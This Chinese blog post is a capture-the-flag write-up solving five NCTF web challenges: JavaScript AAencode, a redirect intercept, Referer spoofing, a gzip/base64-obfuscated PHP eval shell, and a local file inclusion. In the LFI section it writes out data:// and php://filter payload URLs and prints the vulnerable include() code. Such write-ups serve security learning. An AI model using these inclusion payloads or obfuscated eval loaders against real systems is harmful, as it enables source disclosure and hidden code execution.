---
layout: post
title: NCTF Web 5 题题解（Part 1）
tags: NCTF Write-up Web
---

* 目录: 
{:toc}

### 100 AAencode  
* 题目:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/*bgOs61*KFAG82G7BTNqrGItjt.ktJ5DEHDJE5kTwZ0!/r/dLAAAAAAAAAA){: width="80%"}  

	> javascript aaencode  
	> [http://115.28.150.176/aaencode.txt](http://115.28.150.176/aaencode.txt)  

* 题解:  
都提示是 JavaScript 了, 用浏览器的 console 跑一下试试看:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/7emM69dnS7ZiLfZmcGMc1mk0P7QN6H3wAiN4oNL7DWc!/r/dK0AAAAAAAAA){: width="100%"}  

* flag: nctf{javascript_aaencode}
<hr>

### 100 单身二十年  
* 题目:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/WYGRVUjGV*Seie8dVvZK0XeWSXdMghMl8ZSTwg7P1MQ!/r/dNwAAAAAAAAA){: width="80%"}  

	> 这题可以靠技术也可以靠手速！  
	> 老夫单身二十年，自然靠的是手速！  
	> 题目地址: [撸了他！](http://chinalover.sinaapp.com/web8/)  

* 题解:  
点第一个页面的链接, 仔细看的话能看出有跳转, 我手速真的很快, 尝试了一次就把中间那张图给截下来了:   
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/UJ8QZWkWjyr2Hb3Hn2cJ13jGbavVW50o85ufVdzGJ.4!/r/dHwBAAAAAAAA){: width="100%"}  
有跳转当然要用拦截工具了, Fiddler F11:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/4AA5qT.T.175*MSDjRHzZVQth8MBb0ABbzmuMMbdeUg!/r/dAYBAAAAAAAA){: width="100%"}  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/n1ROW56tMZs59r2zFaCAfmgjNv13*X3dYTDmlSiKLwk!/r/dMYAAAAAAAAA){: width="100%"}  

* flag: nctf{yougotit_script_now}   
<hr>

### 100 你从哪里来  
* 题目:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/v*Uij.KE8SrMaM1tLIqjOglZk28IiVgEd.oIMsd3nn8!/r/dAsBAAAAAAAA){: width="80%"}  

	> 你是从 google 来的吗？   
	> [http://115.28.150.176/referer/index.php](http://115.28.150.176/referer/index.php)

* 题解:   
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/hTd7cZZ8kw.YdL*gWelw5gm1kdJ*X77oh2Igujh.I5U!/r/dNwAAAAAAAAA){: width="80%"}  
很明显, 改 HTTP requests 中的 `referer`, 可以用 firefox 的 tamper data 插件, 这里还是用 fiddler.    
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/uNpijEofdO0qmGhtguDly8WZGWnz91dZqLYAcHC3QjA!/r/dAoBAAAAAAAA){: width="100%"}  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/iv38eCVvlcyWeP23wuUlYRV7KIAmzB0eVfMN7SEUQvk!/r/dHwBAAAAAAAA){: width="100%"}  

* flag: nctf{http_referer}   
<hr>

### 100 php decode  
* 题目:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/1mXB.qFELl2GEUfhE6ulQMICaWnfaI1LQ7fTvxPlYEk!/r/dAoBAAAAAAAA){: width="80%"}  

	> 见到的一个类似编码的shell，请解码   
	> 
	> ```php   
	<?php
	function CLsI($ZzvSWE) {
		$ZzvSWE = gzinflate(base64_decode($ZzvSWE));
		for ($i = 0; $i < strlen($ZzvSWE); $i++) {
			$ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
		}
		return $ZzvSWE;
	}
	eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
	?>
	> ```  
	> 

* 题解:   
	首先运行题目给的代码, 结果解释器报错:  

	> Parse error: syntax error, unexpected '{' in D:\Course\CTF\NCTF\php decode\decode.php(16) : eval()'d code on line 2  

	那么回来看看出错的代码: `eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));` 
	eval 的参数必须是一个合法的 php 语句, 那么还是先把 eval 的参数输出看看再说, 代码改成:  
	`echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));`, 结果输出如下:

	> 锘縫hpinfo();  
	> flag:nctf{gzip_base64_hhhhhh}  

* flag: nctf{gzip_base64_hhhhhh}  
<hr>

### 150 文件包含  
* 题目:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/tIHjsm6TX.J6ADSq701wt770uWEjWxbA3IpLKPVB504!/r/dK0AAAAAAAAA){: width="80%"}  

	> 没错 这就是传说中的LFI  
	> 传送门[点我带你飞](http://4.chinalover.sinaapp.com/web7/index.php)  
	>   
	> TIPS:[http://drops.wooyun.org/tips/3827](http://drops.wooyun.org/tips/3827)  

* 题解:   
	题目是文件包含, 而且是 LFI, 即本地文件包含, 那应该就不是远程包含一句话这类思路了, 先试试直接写 shell 呢?
	[http://4.chinalover.sinaapp.com/web7/index.php?file=data:text/plain,<?php phpinfo();?>](http://4.chinalover.sinaapp.com/web7/index.php?file=data:text/plain,<?php phpinfo();?>)  
	结果是:  

	> Oh no!  

	嗯...试试读源码, php 有个特殊协议(其实我也不会php, 提示给的乌云drops很好, 但是乌云已经...:(, php://filter 用于数据流打开时的筛选过滤应用, 如果通过它读取 php 文件并编码成不能正常运行的形式, 就可以得到编码后的源码了, 试试?
	[http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php](http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php)
	结果是:  

	> PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=  

	base64 解码后:

	> ```  
	> <html>  
	> <title>asdf</title>  
    >  
	> <?php  
	> error_reporting(0);  
	> if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}  
	> $file=$_GET['file'];  
	> if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){  
	>     echo "Oh no!";  
	> exit();  
	> }  
	> include($file);   
	> //flag:nctf{edulcni_elif_lacol_si_siht}  
	> 
	> ?>  
	> </html>  
	> ```  

* flag: nctf{edulcni_elif_lacol_si_siht}  
<hr>

<div style="display:inline;float:left">  
	<a href="/2016/10/02/writeup-nctf-web-part-0.html">上 • NCTF Web 5 题题解（Part 0）</a>  
</div>  
<div style="display:inline;float:right">  
	<a href="/2017/02/09/writeup-nctf-web-part-2.html">下 • NCTF Web 5 题题解（Part 2）</a>
</div>